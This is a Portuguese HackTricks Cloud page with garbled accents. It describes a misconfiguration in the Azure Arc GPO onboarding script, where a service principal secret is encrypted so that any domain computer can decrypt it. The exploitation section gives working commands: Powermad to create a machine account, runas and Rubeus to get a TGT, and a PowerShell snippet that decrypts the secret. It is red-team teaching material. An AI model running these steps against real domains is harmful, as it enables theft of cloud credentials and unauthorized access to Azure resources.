# Az - Script de Implanta√ß√£o de GPO Vulner√°vel do Azure Arc

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

- Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
- Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

### Identificando os Problemas

O Azure Arc permite a integra√ß√£o de novos servidores internos (servidores de dom√≠nio associados) no Azure Arc usando o m√©todo do Objeto de Pol√≠tica de Grupo. Para facilitar isso, a Microsoft fornece um kit de ferramentas de implanta√ß√£o necess√°rio para iniciar o procedimento de integra√ß√£o. Dentro do arquivo ArcEnableServerGroupPolicy.zip, os seguintes scripts podem ser encontrados: DeployGPO.ps1, EnableAzureArc.ps1 e AzureArcDeployment.psm1.

Quando executado, o script DeployGPO.ps1 realiza as seguintes a√ß√µes:

1. Cria a GPO de Integra√ß√£o de Servidores Azure Arc dentro do dom√≠nio local.
2. Copia o script de integra√ß√£o EnableAzureArc.ps1 para o compartilhamento de rede designado criado para o processo de integra√ß√£o, que tamb√©m cont√©m o pacote de instala√ß√£o do Windows.

Ao executar este script, os sys admins precisam fornecer dois par√¢metros principais: **ServicePrincipalId** e **ServicePrincipalClientSecret**. Al√©m disso, s√£o necess√°rios outros par√¢metros, como o dom√≠nio, o FQDN do servidor que hospeda o compartilhamento e o nome do compartilhamento. Detalhes adicionais, como o ID do locat√°rio, grupo de recursos e outras informa√ß√µes necess√°rias tamb√©m devem ser fornecidos ao script.

Um segredo criptografado √© gerado no diret√≥rio AzureArcDeploy no compartilhamento especificado usando a criptografia DPAPI-NG. O segredo criptografado √© armazenado em um arquivo chamado encryptedServicePrincipalSecret. Evid√™ncias disso podem ser encontradas no script DeployGPO.ps1, onde a criptografia √© realizada chamando ProtectBase64 com $descriptor e $ServicePrincipalSecret como entradas. O descritor consiste nos SIDs dos grupos Domain Computer e Domain Controller, garantindo que o ServicePrincipalSecret s√≥ possa ser descriptografado pelos grupos de seguran√ßa Domain Controllers e Domain Computers, como observado nos coment√°rios do script.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Explora√ß√£o

Temos as seguintes condi√ß√µes:

1. Conseguimos penetrar com sucesso na rede interna.
2. Temos a capacidade de criar ou assumir o controle de uma conta de computador dentro do Active Directory.
3. Descobrimos um compartilhamento de rede contendo o diret√≥rio AzureArcDeploy.

Existem v√°rios m√©todos para obter uma conta de m√°quina dentro de um ambiente AD. Um dos mais comuns √© explorar a cota de conta de m√°quina. Outro m√©todo envolve comprometer uma conta de m√°quina por meio de ACLs vulner√°veis ou v√°rias outras configura√ß√µes incorretas.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Uma vez que uma conta de m√°quina √© obtida, √© poss√≠vel autenticar usando esta conta. Podemos usar o comando runas.exe com a flag netonly ou usar pass-the-ticket com Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Ao ter o TGT para a conta de nosso computador armazenado na mem√≥ria, podemos usar o seguinte script para descriptografar o segredo do principal de servi√ßo.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativamente, podemos usar [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

Neste ponto, podemos reunir as informa√ß√µes restantes necess√°rias para conectar ao Azure a partir do arquivo ArcInfo.json, que est√° armazenado no mesmo compartilhamento de rede que o arquivo encryptedServicePrincipalSecret. Este arquivo cont√©m detalhes como: TenantId, servicePrincipalClientId, ResourceGroup e mais. Com essas informa√ß√µes, podemos usar o Azure CLI para autenticar como o servi√ßo principal comprometido.

## Refer√™ncias

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

- Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
- Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
